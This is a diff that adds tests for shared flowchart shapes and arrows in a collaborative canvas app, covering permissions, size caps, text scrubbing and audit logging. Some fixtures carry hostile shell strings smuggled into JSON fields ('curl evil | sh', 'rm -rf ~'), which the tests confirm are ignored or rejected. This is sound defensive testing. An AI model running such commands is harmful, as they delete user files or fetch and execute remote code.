@@ -386,6 +386,144 @@ async function until(pred, ms = 3000) {
       /onAttachRelay=\{\(p\) => \{ if \(p\.relay !== undefined\) openRelayPanel\(\{ program: p\.relay\.program, sessionId: p\.relay\.session/.test(canvas))
   }
 
+  // ── M392: shared flowcharts — a shape's record and a panel's arrows ─────
+  {
+    const a = M.ops.authorizeCanvasOp
+    const me = { userId: UA, host: 'hosta1' }
+    const shapeP = (text, extra = {}) => ({ id: 'sh1', kind: 'shape', title: '', x: 0, y: 0, w: 160, h: 72, z: 1, shape: { form: 'decision', text, fill: 'yellow' }, ...extra })
+    const term = (extra = {}) => ({ id: 't1', kind: 'terminal', title: 'build', x: 400, y: 0, w: 400, h: 300, z: 1, ...extra })
+    const diff = (doc, panels, warn) => M.doc.diffLocal(doc, { panels, groups: [] }, me, () => false, (t) => t.replace(/SECRET/g, '[hidden]'), warn)
+    const applyAll = (doc, ops) => { for (const op of ops) M.doc.applyCanvasOp(doc, op, 'test'); return ops }
+    const readOne = (doc, key) => M.doc.readSharedPanels(doc).live.find((x) => x.id === key)
+
+    // Round trip: create carries both fields; a relabel is ONE panel-content; unchanged writes nothing; the last arrow removed deletes the field.
+    const doc = new Y.Doc()
+    const created = applyAll(doc, diff(doc, [shapeP('Ship it?\nSECRET plan'), term({ connectors: [{ id: 'cx1', to: 'sh1', label: 'SECRET ok', route: 'curved' }] })]))
+    const s1 = readOne(doc, 'hosta1_sh1'), t1 = readOne(doc, 'hosta1_t1')
+    const relabel = applyAll(doc, diff(doc, [shapeP('Ship it now?'), term({ connectors: [{ id: 'cx1', to: 'sh1', label: 'SECRET ok', route: 'curved' }] })]))
+    const same = diff(doc, [shapeP('Ship it now?'), term({ connectors: [{ id: 'cx1', to: 'sh1', label: 'SECRET ok', route: 'curved' }] })])
+    const unlinked = applyAll(doc, diff(doc, [shapeP('Ship it now?'), term()]))
+    ok('cs.flow.1 a shape\'s record and a panel\'s arrows round-trip: create carries both (words scrubbed where they leave, targets as doc keys), a relabel is ONE panel-content, an unchanged save writes nothing, and the last arrow removed removes the field',
+      created.length === 2 && created.every((o) => o.kind === 'create') &&
+        s1?.shape?.form === 'decision' && s1.shape.text === 'Ship it?\n[hidden] plan' && s1.shape.fill === 'yellow' &&
+        JSON.stringify(t1?.connectors) === JSON.stringify([{ id: 'cx1', to: 'hosta1_sh1', route: 'curved', label: '[hidden] ok' }]) &&
+        relabel.length === 2 && relabel.every((o) => o.kind === 'panel-content' || o.kind === 'retitle') && relabel.some((o) => o.kind === 'panel-content' && o.field === 'shape') &&
+        readOne(doc, 'hosta1_sh1')?.shape?.text === 'Ship it now?' && same.length === 0 &&
+        unlinked.length === 1 && unlinked[0].kind === 'panel-content' && unlinked[0].field === 'connectors' && unlinked[0].value === null &&
+        field(doc, 'hosta1_t1', 'connectors') === undefined && readOne(doc, 'hosta1_t1')?.connectors === undefined,
+      JSON.stringify({ created, s1, t1, relabel, same, unlinked }))
+
+    ok('cs.flow.2 a shape\'s shared title is its label\'s first line, taken AFTER the scrub (a client that draws no shapes still names the placeholder); an empty shape says what it is',
+      s1?.title === 'Ship it?' && readOne(doc, 'hosta1_sh1')?.title === 'Ship it now?' &&
+        applyAll(new Y.Doc(), diff(new Y.Doc(), [shapeP('SECRET token here')]))[0].panel.title === '[hidden] token here' &&
+        diff(new Y.Doc(), [shapeP('   \n  ')])[0].panel.title === 'an empty decision', JSON.stringify(s1))
+
+    // Malformed and over-cap cost the FIELD, never the panel; absent is not malformed.
+    const raw = new Y.Doc()
+    const put = (key, fields) => raw.transact(() => { const fm = new Y.Map(); raw.getMap(M.doc.CANVAS_PANELS).set(key, fm); for (const [k, v] of Object.entries({ kind: 'shape', title: 't', owner: UA, host: 'hosta1', x: 0, y: 0, w: 160, h: 72, z: 1, ...fields })) fm.set(k, v) })
+    put('hosta1_a', { shape: 'not json {' })
+    put('hosta1_b', { shape: JSON.stringify({ form: 'hexagon', text: 'x' }), connectors: 7 })
+    put('hosta1_c', { shape: JSON.stringify({ form: 'process', text: 'x'.repeat(10) + ' '.repeat(M.ops.SHARED_SHAPE_MAX) }) })
+    put('hosta1_d', { kind: 'terminal', shape: JSON.stringify({ form: 'process', text: 'on a terminal' }), connectors: '[{"id":' })
+    put('hosta1_e', {})
+    const rl = M.doc.readSharedPanels(raw).live
+    const byKey = (k) => rl.find((x) => x.id === k)
+    ok('cs.flow.3 malformed JSON, an unknown form, a non-string, a value past its cap and a shape record on a terminal each cost THAT field, never the panel; absent fields read as absent',
+      ['hosta1_a', 'hosta1_b', 'hosta1_c', 'hosta1_d', 'hosta1_e'].every((k) => byKey(k) !== undefined) &&
+        rl.every((x) => x.shape === undefined && x.connectors === undefined), JSON.stringify(rl))
+
+    // Over the cap on the WRITING side: not written, and said in main's log.
+    const warnings = []
+    const overShape = diff(new Y.Doc(), [shapeP('\u0001'.repeat(400))], (m) => warnings.push(m))
+    const quotes = '"'.repeat(120)
+    const many = Array.from({ length: 64 }, (_, i) => ({ id: `cx${i}`, to: 'sh1', label: quotes }))
+    const overConn = diff(new Y.Doc(), [shapeP('ok'), term({ connectors: many })], (m) => warnings.push(m))
+    const logged = []
+    const LW = machine({ host: 'hostw1', userId: UA, role: 'owner', panels: [shapeP('\u0001'.repeat(400))], extra: { log: (m) => logged.push(m) } })
+    LW.bind(); await tick(); LW.sync.saved(0); LW.sync.saved(0); await tick()
+    ok('cs.flow.4 a shape record past SHARED_SHAPE_MAX and arrows past SHARED_CONNECTORS_MAX are NOT written (the panel is, without them) and main logs it — once, not per save',
+      overShape.length === 1 && overShape[0].kind === 'create' && overShape[0].panel.shape === undefined &&
+        overConn.find((o) => o.panel.id === 'hosta1_t1')?.panel.connectors === undefined &&
+        warnings.length === 2 && /shape record is past the shared cap/.test(warnings[0]) && /arrows are past the shared cap/.test(warnings[1]) &&
+        field(LW.doc, 'hostw1_sh1', 'kind') === 'shape' && field(LW.doc, 'hostw1_sh1', 'shape') === undefined &&
+        logged.length === 1 && /\[canvas-sync\] panel hostw1_sh1/.test(logged[0]),
+      JSON.stringify({ warnings, logged }))
+    LW.unbind()
+
+    // The gate: panel-content is the retitle rule.
+    const pc = { kind: 'panel-content', panelId: 'hosta1_sh1', field: 'shape', value: '{"form":"process","text":"x"}' }
+    const mine = { userId: UA, panelOwner: UA }, theirs = { userId: UB, panelOwner: UA }
+    ok('cs.flow.5 panel-content is the owner\'s alone: owner and editor on their own panel; never an editor — nor the workspace owner — on someone else\'s, never a viewer, never an unshared room, never a panel that is not there',
+      a('owner', pc, mine).ok && a('editor', pc, { userId: UB, panelOwner: UB }).ok &&
+        !a('editor', pc, theirs).ok && /only the person whose panel it is/.test(a('editor', pc, theirs).reason) &&
+        !a('owner', { ...pc, field: 'connectors' }, theirs).ok && !a('viewer', pc, mine).ok && /viewer/.test(a('viewer', pc, mine).reason) &&
+        !a(null, pc, mine).ok && !a('owner', pc, { userId: UA, panelOwner: null }).ok && !a('owner', pc, { userId: UA, panelOwner: null, panelDeleted: true }).ok)
+
+    // inspectUpdate reads the two fields as panel-content; every OTHER field is still unknown.
+    const probe = (mutate) => { const d = new Y.Doc(); Y.applyUpdate(d, Y.encodeStateAsUpdate(doc)); const sv0 = Y.encodeStateVector(d); d.transact(() => mutate(d)); return M.doc.inspectUpdate(doc, Y.encodeStateAsUpdate(d, sv0)) }
+    const pm = (d) => d.getMap(M.doc.CANVAS_PANELS)
+    const setShape = probe((d) => pm(d).get('hosta1_sh1').set('shape', '{"form":"process","text":"hijacked"}'))
+    const setConn = probe((d) => pm(d).get('hosta1_t1').set('connectors', '[{"id":"cx9","to":"hosta1_sh1"}]'))
+    const delShape = probe((d) => pm(d).get('hosta1_sh1').delete('shape'))
+    const notText = probe((d) => pm(d).get('hosta1_sh1').set('shape', 12))
+    const tooBig = probe((d) => pm(d).get('hosta1_t1').set('connectors', 'x'.repeat(M.ops.SHARED_CONNECTORS_MAX + 1)))
+    const onTerm = probe((d) => pm(d).get('hosta1_t1').set('shape', '{"form":"process","text":"x"}'))
+    const command = probe((d) => pm(d).get('hosta1_t1').set('command', 'rm -rf ~'))
+    const withContent = probe((d) => { const fm = new Y.Map(); pm(d).set('hostb1_sh2', fm); for (const [k, v] of Object.entries({ kind: 'shape', title: 'q', owner: UB, host: 'hostb1', x: 0, y: 0, w: 1, h: 1, z: 1, shape: '{"form":"io","text":"q"}' })) fm.set(k, v) })
+    const bigCreate = probe((d) => { const fm = new Y.Map(); pm(d).set('hostb1_sh3', fm); for (const [k, v] of Object.entries({ kind: 'shape', title: 'q', owner: UB, host: 'hostb1', x: 0, y: 0, w: 1, h: 1, z: 1, shape: 'x'.repeat(M.ops.SHARED_SHAPE_MAX + 1) })) fm.set(k, v) })
+    const unknownOnly = (r) => r.length > 0 && r.every((x) => x.op.kind === 'unknown')
+    ok('cs.flow.6 inspectUpdate reads a shape or arrows write (or removal) as panel-content with the panel\'s owner as it stood; a non-string, a value past its cap, a shape on a terminal and any other new field (a `command`) are unknown; a panel created WITH its shape is its create, and created past the cap is unknown',
+      setShape.length === 1 && setShape[0].op.kind === 'panel-content' && setShape[0].op.field === 'shape' && setShape[0].ctx.panelOwner === UA &&
+        setConn.length === 1 && setConn[0].op.field === 'connectors' && delShape.length === 1 && delShape[0].op.value === null &&
+        unknownOnly(notText) && unknownOnly(tooBig) && unknownOnly(onTerm) && unknownOnly(command) &&
+        withContent.length === 1 && withContent[0].op.kind === 'create' && withContent[0].op.panel.shape?.form === 'io' && unknownOnly(bigCreate) &&
+        !a('editor', setShape[0].op, { userId: UB, ...setShape[0].ctx }).ok,
+      JSON.stringify({ setShape, setConn, delShape, notText, tooBig, onTerm, command, withContent, bigCreate }))
+
+    // Targets: an arrow to a panel not in the doc (or a tombstone) is dropped on read.
+    const tgt = new Y.Doc()
+    applyAll(tgt, diff(tgt, [shapeP('a'), term(), { ...term(), id: 't2' }]))
+    tgt.transact(() => {
+      pm(tgt).get('hosta1_sh1').set('connectors', JSON.stringify([{ id: 'c1', to: 'hosta1_t1' }, { id: 'c2', to: 'hostz9_nowhere' }, { id: 'c3', to: 'hosta1_t2' }, { id: 'c4', to: 'hosta1_sh1' }]))
+      pm(tgt).get('hosta1_t2').set('deleted', true)
+    })
+    ok('cs.flow.7 an arrow whose target is not a live panel in the same doc — never there, or a tombstone — is dropped on read (as is one to itself); the rest of the list survives',
+      JSON.stringify(readOne(tgt, 'hosta1_sh1')?.connectors) === JSON.stringify([{ id: 'c1', to: 'hosta1_t1' }]), JSON.stringify(readOne(tgt, 'hosta1_sh1')))
+
+    // Inert: whatever else a peer puts in the JSON is not read.
+    const inert = new Y.Doc()
+    inert.transact(() => {
+      const fm = new Y.Map(); pm(inert).set('hostb1_sh5', fm)
+      for (const [k, v] of Object.entries({ kind: 'shape', title: 'x', owner: UB, host: 'hostb1', x: 0, y: 0, w: 160, h: 72, z: 1,
+        shape: JSON.stringify({ form: 'process', text: 'hi', command: 'curl evil | sh', cwd: '/', onClick: 'x' }),
+        connectors: JSON.stringify([{ id: 'c1', to: 'hostb1_t1', run: 'rm -rf ~', automation: { kind: 'handoff' } }]) })) fm.set(k, v)
+      const t = new Y.Map(); pm(inert).set('hostb1_t1', t)
+      for (const [k, v] of Object.entries({ kind: 'terminal', title: 't', owner: UB, host: 'hostb1', x: 0, y: 0, w: 1, h: 1, z: 1 })) t.set(k, v)
+    })
+    const ip = readOne(inert, 'hostb1_sh5')
+    ok('cs.flow.8 INERT: a shape reads back as a form and words, an arrow as a line and its ends — any other field a peer writes inside the JSON (a command, a cwd, an automation) is not read',
+      JSON.stringify(ip?.shape) === JSON.stringify({ form: 'process', text: 'hi' }) && JSON.stringify(ip?.connectors) === JSON.stringify([{ id: 'c1', to: 'hostb1_t1' }]), JSON.stringify(ip))
+
+    // Two machines: B sees A's shape and A's arrow; an arrow aimed at one of B's OWN panels comes to B's renderer under B's local id.
+    const FA = machine({ host: 'hosta1', userId: UA, role: 'owner', panels: [shapeP('Deploy?'), term({ connectors: [{ id: 'cx1', to: 'sh1' }] })] })
+    const FB = machine({ host: 'hostb1', userId: UB, role: 'editor', panels: [{ ...term(), id: 'n7', title: 'mine' }] })
+    FA.bind(); FB.bind(); relay(FA.doc, FB.doc); await tick()
+    FA.doc.transact(() => { pm(FA.doc).get('hosta1_sh1').set('connectors', JSON.stringify([{ id: 'cx2', to: 'hostb1_n7' }])) }, 'test')
+    await tick()
+    FB.sync.activated(); await tick()
+    const seenShape = FB.view().placeholders.find((x) => x.id === 'hosta1_sh1')
+    const seenTerm = FB.view().placeholders.find((x) => x.id === 'hosta1_t1')
+    const movedShape = FB.sync.op({ kind: 'rect', panelId: 'hosta1_sh1', fields: { x: 44 } })
+    await tick()
+    ok('cs.flow.9 a teammate\'s view carries the shape placeholder with its record and summary title, and its arrows — aimed at the teammate\'s own panels by their LOCAL id, at everyone else\'s by doc key; an editor may still move the shape',
+      seenShape?.kind === 'shape' && seenShape.shape?.text === 'Deploy?' && seenShape.title === 'Deploy?' &&
+        JSON.stringify(seenShape.connectors) === JSON.stringify([{ id: 'cx2', to: 'n7' }]) &&
+        JSON.stringify(seenTerm?.connectors) === JSON.stringify([{ id: 'cx1', to: 'hosta1_sh1' }]) &&
+        movedShape.ok && FA.ws.panels.find((x) => x.id === 'sh1').x === 44,
+      JSON.stringify({ seenShape, seenTerm, movedShape }))
+    FA.unbind(); FB.unbind()
+  }
+
   // ── the renderer never holds the doc ────────────────────────────────────
   {
     const files = []
@@ -854,6 +992,34 @@ async function until(pred, ms = 3000) {
         ed3.st.closed > ed3Closed && field(owner.doc, 'hosta1_r2', 'relaySession') === RS && refusals.some((r) => r.userId === UB && /relay session/.test(r.reason)),
         JSON.stringify(refusals.slice(-1)))
 
+      // M392. A shape's words and a panel's arrows are their owner's: an
+      // editor moves the owner's shape through beforeSync, and rewriting its
+      // record or removing its arrows is refused, closed, and applies nothing.
+      M.doc.applyCanvasOp(owner.doc, { kind: 'create', panel: { id: 'hosta1_sh1', kind: 'shape', title: 'Ship?', owner: UA, host: 'hosta1', x: 0, y: 0, w: 160, h: 72, z: 1, shape: { form: 'decision', text: 'Ship?' } } }, 'test')
+      M.doc.applyCanvasOp(owner.doc, { kind: 'panel-content', panelId: 'hosta1_sh1', field: 'connectors', value: JSON.stringify([{ id: 'cx1', to: 'hosta1_n1' }]) }, 'test')
+      const ownerShape = field(owner.doc, 'hosta1_sh1', 'shape'), ownerArrows = field(owner.doc, 'hosta1_sh1', 'connectors')
+      const ed6 = join('teditor')
+      await until(() => ed6.st.synced && live(ed6.doc).find((x) => x.id === 'hosta1_sh1')?.connectors?.length === 1)
+      const ed6Sees = live(ed6.doc).find((x) => x.id === 'hosta1_sh1')
+      M.doc.applyCanvasOp(ed6.doc, { kind: 'rect', panelId: 'hosta1_sh1', fields: { x: 30 } }, 'test')
+      await until(() => field(owner.doc, 'hosta1_sh1', 'x') === 30)
+      const ed6Closed = ed6.st.closed
+      ed6.doc.getMap(M.doc.CANVAS_PANELS).get('hosta1_sh1').set('shape', JSON.stringify({ form: 'process', text: 'hijacked' }))
+      await until(() => ed6.st.closed > ed6Closed, 2000)
+      const ed7 = join('teditor')
+      await until(() => ed7.st.synced && live(ed7.doc).some((x) => x.id === 'hosta1_sh1'))
+      const ed7Closed = ed7.st.closed
+      ed7.doc.getMap(M.doc.CANVAS_PANELS).get('hosta1_sh1').delete('connectors')
+      await until(() => ed7.st.closed > ed7Closed, 2000)
+      await new Promise((r) => setTimeout(r, 200))
+      const kept = live(owner.doc).find((x) => x.id === 'hosta1_sh1')
+      ok('srv.flow.1 through the real server: an editor sees the owner\'s shape and its arrow, and may move it; rewriting its record or removing its arrows is refused by beforeSync, the connection closes, and the room keeps the owner\'s words and arrows',
+        ed6Sees?.shape?.text === 'Ship?' && ed6Sees.connectors?.[0]?.to === 'hosta1_n1' && field(owner.doc, 'hosta1_sh1', 'x') === 30 &&
+          ed6.st.closed > ed6Closed && ed7.st.closed > ed7Closed &&
+          field(owner.doc, 'hosta1_sh1', 'shape') === ownerShape && field(owner.doc, 'hosta1_sh1', 'connectors') === ownerArrows && kept?.shape?.text === 'Ship?' &&
+          refusals.some((r) => r.userId === UB && /changes its shape/.test(r.reason)) && refusals.some((r) => r.userId === UB && /changes its arrows/.test(r.reason)),
+        JSON.stringify({ ed6Sees, kept, refusals: refusals.slice(-3) }))
+
       // M375. The team queue through the real server: the owner opens an ask
       // for their own agent; an editor's answer in their OWN name reaches
       // the owner; the same editor answering in the owner's name is refused
@@ -1042,11 +1208,14 @@ async function until(pred, ms = 3000) {
       editor.doc.getMap(M.doc.CANVAS_PANELS).get('hosta1_s1').set('deleted', true)
       await until(() => editor.st.closed > closedBefore, 2000)
       M.doc.applyCanvasOp(owner.doc, { kind: 'ask-close', askId: 'hosta1_qa', outcome: 'allowed' }, 'test')
+      // M392. A diagram edit (panel-content) is no row of its own: it is counted in its author's summary.
+      M.doc.applyCanvasOp(owner.doc, { kind: 'panel-content', panelId: 'hosta1_s1', field: 'connectors', value: '[]' }, 'test')
       M.doc.applyCanvasOp(owner.doc, { kind: 'delete', panelId: 'hosta1_s1' }, 'test')
       await new Promise((r) => setTimeout(r, 300))
       owner.p.destroy(); editor.p.destroy()
       // The summary is written as the connection closes: wait for it by awaiting the store itself.
-      for (let i = 0; i < 150 && !(await audit.list(ROOM, 50)).some((r) => r.action === 'edited'); i++) await new Promise((r) => setTimeout(r, 20))
+      // M392: both authors' summaries — the owner's carries a diagram edit (audit.flow.1).
+      for (let i = 0; i < 150 && (await audit.list(ROOM, 50)).filter((r) => r.action === 'edited').length < 2; i++) await new Promise((r) => setTimeout(r, 20))
       rows = (await audit.list(ROOM, 50)).reverse()
     } finally {
       await srv.destroy()
@@ -1058,6 +1227,10 @@ async function until(pred, ms = 3000) {
         edited !== undefined && /moves 2/.test(edited.detail) &&
         rows.filter((r) => r.action === 'delete').length === 1 && !JSON.stringify(rows).includes('secret project title'),
       JSON.stringify(seq))
+    const ownerEdited = rows.find((r) => r.action === 'edited' && r.userId === UA)
+    ok('audit.flow.1 a diagram edit is counted under its author\'s `edited` summary as `diagram edits` — the trail\'s action set is pinned by the migration\'s CHECK, so it takes no new word (and no new migration); a summary with none reads as before',
+      ownerEdited !== undefined && /diagram edits 1$/.test(ownerEdited.detail) && edited !== undefined && !/diagram/.test(edited.detail) && !rows.some((r) => r.action === 'panel-content'),
+      JSON.stringify(rows.filter((r) => r.action === 'edited')))
   }
 
   // ── M348: local-first — an offline edit survives a crash and reaches the room ──
